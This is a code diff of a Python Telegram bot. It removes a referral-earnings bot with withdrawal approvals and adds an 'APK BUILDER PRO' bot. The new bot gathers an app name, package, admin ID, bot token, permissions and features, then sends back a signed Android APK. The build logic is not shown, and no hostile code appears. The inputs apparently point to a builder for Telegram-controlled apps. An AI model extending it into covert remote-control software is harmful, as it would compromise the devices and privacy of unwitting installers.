-    q = update.callback_query
-    await q.answer()
-    with db() as conn:
-        row = conn.execute("SELECT * FROM users WHERE user_id=?", (q.from_user.id,)).fetchone()
-    if not row:
-        await q.answer("افتح التطبيق", show_alert=True)
-        return
-    rank, total = user_rank(q.from_user.id)
-    await q.answer(
-        f"💰 ${row['balance']:.2f}\n📊 ${row['total_earned']:.2f}\n🏆 {rank}/{total}",
-        show_alert=True)
-
-
-async def callback_show_lb(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query
-    await q.answer()
-    with db() as conn:
-        rows = conn.execute(
-            """SELECT first_name, total_earned FROM users
-               WHERE banned=0 ORDER BY total_earned DESC LIMIT 10""").fetchall()
-    if not rows:
-        await q.message.reply_text("—")
-        return
-    medals = ["🥇", "🥈", "🥉"]
-    txt = "🏆 *Top 10*\n▬▬▬▬▬▬▬▬▬▬\n"
-    for i, r in enumerate(rows):
-        ico = medals[i] if i < 3 else f"{i+1}."
-        txt += f"{ico} {r['first_name'] or 'User'} — `${r['total_earned']:.2f}`\n"
-    await q.message.reply_text(txt, parse_mode="Markdown")
-
-
-async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query
-    await q.answer()
-    if not is_admin(q.from_user.id):
-        await q.edit_message_text("⛔")
-        return
-    d = q.data
-    if d.startswith("wd_ok_"):
-        wid = int(d.split("_")[-1])
-        with db() as conn:
-            row = conn.execute("SELECT * FROM withdrawals WHERE id=?", (wid,)).fetchone()
-            if row and row["status"] == "pending":
-                conn.execute(
-                    "UPDATE withdrawals SET status='approved', processed_at=? WHERE id=? AND status='pending'",
-                    (datetime.now(timezone.utc).isoformat(), wid))
-            elif row:
-                await q.answer("تمت معالجة الطلب مسبقًا", show_alert=True)
-                return
-        if row:
-            try:
-                await context.bot.send_message(
-                    chat_id=row["user_id"],
-                    text=f"✅ `${row['amount']:.2f}` approved",
-                    parse_mode="Markdown")
-            except Exception: pass
-        await q.answer("✅", show_alert=True)
-        return
-    if d.startswith("wd_no_"):
-        wid = int(d.split("_")[-1])
-        with db() as conn:
-            row = conn.execute("SELECT * FROM withdrawals WHERE id=?", (wid,)).fetchone()
-            if row and row["status"] == "pending":
-                conn.execute("UPDATE users SET balance=balance+? WHERE user_id=?",
-                             (row["amount"], row["user_id"]))
-                conn.execute(
-                    "UPDATE withdrawals SET status='rejected', processed_at=? WHERE id=?",
-                    (datetime.now(timezone.utc).isoformat(), wid))
-        if row:
-            try:
-                await context.bot.send_message(
-                    chat_id=row["user_id"],
-                    text=f"❌ `${row['amount']:.2f}` rejected",
-                    parse_mode="Markdown")
-            except Exception: pass
-        await q.answer("❌", show_alert=True)
-        return
-
-
-async def set_bot_commands(app_bot):
-    try:
-        await app_bot.bot.set_my_commands([
-            BotCommand("start", "🏠 Start / ابدأ"),
-            BotCommand("balance", "💰 Balance / رصيدي"),
-            BotCommand("ref", "🤝 Referral / الإحالة"),
-            BotCommand("lang", "🌐 Language / اللغة"),
-        ])
-        try:
-            await app_bot.bot.set_chat_menu_button(
-                menu_button=MenuButtonWebApp(
-                    text="💎 App",
-                    web_app=WebAppInfo(url=WEBAPP_URL)))
-        except Exception:
-            pass
+        apk = await asyncio.to_thread(build_apk, cfg, uid)
+        size = os.path.getsize(apk) / (1024 * 1024)
+        user_apk_count[uid] += 1
+        with open(apk, "rb") as f:
+            await message.reply_document(
+                document=InputFile(f, filename=os.path.basename(apk)),
+                caption=(f"✅ <b>تم البناء!</b>\n\n"
+                    f"📱 <b>{cfg['app_name']}</b>\n"
+                    f"📦 <code>{cfg['pkg_name']}</code>\n"
+                    f"💾 {size:.2f} MB\n"
+                    f"🔐 موقّع ✅\n\n"
+                    f"⚡ ثبّت APK على الجهاز"),
+                parse_mode=ParseMode.HTML)
     except Exception as e:
-        print(f"commands: {e}")
+        await message.reply_text(f"❌ <b>فشل البناء</b>\n\n<code>{str(e)[:500]}</code>",
+            parse_mode=ParseMode.HTML)
+    finally:
+        user_sessions.pop(uid, None)
 
 
-async def run_bot():
+# ═══════════════════════════════════════════════════════════════
+def main():
     if not BOT_TOKEN:
-        print("⚠️ BOT_TOKEN missing")
-        return
-    app_bot = ApplicationBuilder().token(BOT_TOKEN).build()
+        raise SystemExit("❌ BOT_TOKEN غير مضبوط")
+    app = Application.builder().token(BOT_TOKEN).build()
 
-    app_bot.add_handler(CommandHandler("start", cmd_start))
-    app_bot.add_handler(CommandHandler("admin", cmd_admin))
-    app_bot.add_handler(CommandHandler("balance", cmd_balance))
-    app_bot.add_handler(CommandHandler("ref", cmd_ref))
-    app_bot.add_handler(CommandHandler("stats", cmd_stats))
-    app_bot.add_handler(CommandHandler("lang", cmd_lang))
-    app_bot.add_handler(CallbackQueryHandler(callback_set_lang, pattern=r"^set_lang$"))
-    app_bot.add_handler(CallbackQueryHandler(callback_lang_choice, pattern=r"^lang_"))
-    app_bot.add_handler(CallbackQueryHandler(callback_get_ref, pattern=r"^get_ref$"))
-    app_bot.add_handler(CallbackQueryHandler(callback_my_balance, pattern=r"^my_balance$"))
-    app_bot.add_handler(CallbackQueryHandler(callback_show_lb, pattern=r"^show_lb$"))
-    app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern=r"^(wd_ok_|wd_no_)"))
-
-    await app_bot.initialize()
-
-    try:
-        await app_bot.bot.delete_webhook(drop_pending_updates=True)
-        print("✅ Webhook cleared")
-    except Exception as e:
-        print(f"⚠️ delete_webhook: {e}")
-
-    await set_bot_commands(app_bot)
-    await app_bot.start()
-
-    while True:
-        try:
-            await app_bot.updater.start_polling(
-                drop_pending_updates=True,
-                allowed_updates=Update.ALL_TYPES,
-                poll_interval=1.0,
-                timeout=30,
-            )
-            print("✅ Polling started")
-            break
-        except Conflict:
-            print("⚠️ Conflict — retry in 5s")
-            await asyncio.sleep(5)
-        except Exception as e:
-            print(f"⚠️ polling: {e}")
-            await asyncio.sleep(5)
-
-    print(f"📞 @{ADMIN_CONTACT}")
-    while True:
-        await asyncio.sleep(3600)
-
-
-async def run_web():
-    config = uvicorn.Config(app, host=HOST, port=PORT, log_level="warning",
-                            access_log=False, lifespan="on")
-    server = uvicorn.Server(config)
-    await server.serve()
-
-
-async def main():
-    init_db()
-    print(f"🌐 {WEBAPP_URL}")
-    print(f"👑 {ADMIN_IDS}")
-    print(f"🤖 @{BOT_USERNAME}")
-    print(f"💓 Heartbeat: {PING_INTERVAL}s")
-
-    await asyncio.gather(
-        run_web(),
-        run_bot(),
-        internal_heartbeat(),
-        external_heartbeat(),
+    conv = ConversationHandler(
+        entry_points=[
+            CommandHandler("build", new_build),
+            CallbackQueryHandler(new_build, pattern="^new_build$"),
+        ],
+        states={
+            ST_NAME:  [MessageHandler(filters.TEXT & ~filters.COMMAND, st_name)],
+            ST_PKG:   [MessageHandler(filters.TEXT & ~filters.COMMAND, st_pkg)],
+            ST_ADMIN: [MessageHandler(filters.TEXT & ~filters.COMMAND, st_admin)],
+            ST_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, st_token)],
+            ST_PERMS: [CallbackQueryHandler(cb_perms, pattern="^perm:")],
+            ST_FEATS: [CallbackQueryHandler(cb_feats, pattern="^feat:")],
+            ST_THEME: [CallbackQueryHandler(cb_theme, pattern="^theme:")],
+            ST_ICON:  [MessageHandler(filters.PHOTO | filters.Document.IMAGE, st_icon)],
+            ST_CONFIRM:[CallbackQueryHandler(cb_confirm, pattern="^build:")],
+        },
+        fallbacks=[CommandHandler("cancel", cmd_cancel)],
+        allow_reentry=True,
     )
+
+    app.add_handler(CommandHandler("start", cmd_start))
+    app.add_handler(CommandHandler("help", cmd_help))
+    app.add_handler(CallbackQueryHandler(cb_stats, pattern="^stats$"))
+    app.add_handler(CallbackQueryHandler(cb_help, pattern="^help$"))
+    app.add_handler(CallbackQueryHandler(cb_back_home, pattern="^back_home$"))
+    app.add_handler(conv)
+
+    print("╔══════════════════════════════════════╗")
+    print("║   👑  APK BUILDER PRO  v4.0           ║")
+    print("║   🤖  جاهز للعمل...                   ║")
+    print("╚══════════════════════════════════════╝")
+    app.run_polling()
 
 
 if __name__ == "__main__":
-    try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        print("\n👋")
+    main()
